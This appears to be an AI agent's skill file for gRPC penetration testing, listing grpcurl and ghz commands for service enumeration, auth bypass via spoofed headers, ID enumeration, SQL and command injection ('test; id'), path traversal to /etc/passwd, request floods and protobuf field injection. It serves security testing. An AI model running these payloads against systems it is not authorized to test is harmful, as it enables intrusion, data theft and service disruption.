---
name: grpc-testing
description: gRPC API security testing covering reflection, auth bypass, injection, and protobuf manipulation.
allowed-tools: Read, Grep, Glob, Bash
---
# gRPC Security Testing Skill

## When to Use
- Target exposes gRPC services (typically port 50051, or HTTP/2 on standard ports)
- gRPC-Web endpoints detected during recon
- Protobuf content-type detected (application/grpc, application/grpc-web)

## Phase 1: Service Discovery
### Reflection (unauthenticated)
    grpcurl -plaintext HOST:PORT list
    grpcurl -plaintext HOST:PORT describe SERVICE_NAME
    grpcurl -plaintext HOST:PORT describe SERVICE_NAME.MethodName

### Without Reflection (need proto files)
    # Decompile from binary
    protoc --decode_raw < response.bin
    # Use protobuf toolkit to recover .proto
    pbtk extract /path/to/binary

### Service Enumeration
    # List all services
    grpcurl -plaintext HOST:PORT list
    # Describe each service to get method signatures
    grpcurl -plaintext HOST:PORT describe PACKAGE.ServiceName
    # Get full proto definitions
    grpcurl -plaintext -protoset-out desc.bin HOST:PORT describe

## Phase 2: Authentication Testing
    # Unauthenticated access (no token)
    grpcurl -plaintext -d '{"id": 1}' HOST:PORT package.Service/Method

    # With auth token
    grpcurl -plaintext -H "Authorization: Bearer TOKEN" -d '{"id": 1}' HOST:PORT package.Service/Method

    # Test expired/invalid/empty tokens
    grpcurl -plaintext -H "Authorization: Bearer invalid" -d '{"id": 1}' HOST:PORT package.Service/Method
    grpcurl -plaintext -H "Authorization: Bearer " -d '{"id": 1}' HOST:PORT package.Service/Method

    # Test metadata injection
    grpcurl -plaintext -H "x-user-role: admin" -d '{}' HOST:PORT package.Service/Method
    grpcurl -plaintext -H "x-forwarded-for: 127.0.0.1" -d '{}' HOST:PORT package.Service/Method

## Phase 3: BOLA/Authorization Testing
    # Access User A's data with User B's token
    grpcurl -plaintext -H "Authorization: Bearer USER_B_TOKEN" \
      -d '{"user_id": "USER_A_ID"}' HOST:PORT package.UserService/GetUser

    # Enumerate IDs
    for i in $(seq 1 100); do
      grpcurl -plaintext -d "{\"id\": $i}" HOST:PORT package.Service/Get 2>/dev/null
    done

## Phase 4: Injection Testing
    # SQL injection in message fields
    grpcurl -plaintext -d '{"name": "test'\'' OR 1=1--"}' HOST:PORT package.Service/Search
    grpcurl -plaintext -d '{"query": "test\" OR \"1\"=\"1"}' HOST:PORT package.Service/Search

    # Command injection
    grpcurl -plaintext -d '{"filename": "test; id"}' HOST:PORT package.Service/Process

    # Path traversal
    grpcurl -plaintext -d '{"path": "../../../../etc/passwd"}' HOST:PORT package.FileService/Read

## Phase 5: Transport Security
    # Test plaintext (no TLS)
    grpcurl -plaintext HOST:PORT list

    # Test TLS without cert verification
    grpcurl -insecure HOST:PORT list

    # Test with TLS
    grpcurl HOST:PORT list

    # mTLS — test without client cert
    grpcurl -cacert ca.pem HOST:PORT list

## Phase 6: Resource Exhaustion
    # Streaming RPC abuse — send large volume
    ghz --insecure --call package.Service/Method \
      -d '{"data": "x"}' -n 10000 -c 50 HOST:PORT

    # Large message testing
    python3 -c "import json; print(json.dumps({'data': 'A'*1000000}))" | \
      grpcurl -plaintext -d @ HOST:PORT package.Service/Method

    # Deadline/timeout manipulation
    grpcurl -plaintext -max-time 0.001 -d '{}' HOST:PORT package.Service/SlowMethod

## Phase 7: Protobuf Manipulation
    # Unknown field injection (protobuf ignores unknown fields by default)
    grpcurl -plaintext -d '{"id": 1, "role": "admin", "is_admin": true}' HOST:PORT package.Service/Update

    # Type confusion (send string where int expected)
    grpcurl -plaintext -d '{"id": "not_a_number"}' HOST:PORT package.Service/Get

    # Negative/boundary values
    grpcurl -plaintext -d '{"amount": -1}' HOST:PORT package.Service/Transfer
    grpcurl -plaintext -d '{"amount": 999999999999}' HOST:PORT package.Service/Transfer

## Tools
- **grpcurl**: Primary gRPC testing tool (like curl for gRPC)
- **ghz**: gRPC benchmarking and load testing
- **grpcui**: Web-based gRPC UI (interactive testing)
- **Evans**: Interactive gRPC client (REPL mode)
- **protoc**: Protocol buffer compiler
- **pbtk**: Protobuf toolkit for reverse engineering
- **Blackbox Protobuf**: Burp extension for protobuf

## Output
For each finding: service/method, request payload, response, auth context, severity.

## Validate & Promote

Findings from this skill are born `theoretical` (see the validation layer in the repo-root `CLAUDE.md`). They do NOT enter a report or external submission until promoted to `confirmed` with `scripts/validate-finding.sh`, after the independent check below.

- **Independent check for this class:** Confirm the unauthorized method actually returns protected data or performs the action, with a denied control for comparison.
- Only `confirmed` findings ship. `validated` = reproduced but not independently confirmed.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent specter \
  --id SPE-NNN --state confirmed --method manual-repro \
  --negative-control "<what you proved, and the control result>" --by specter
```
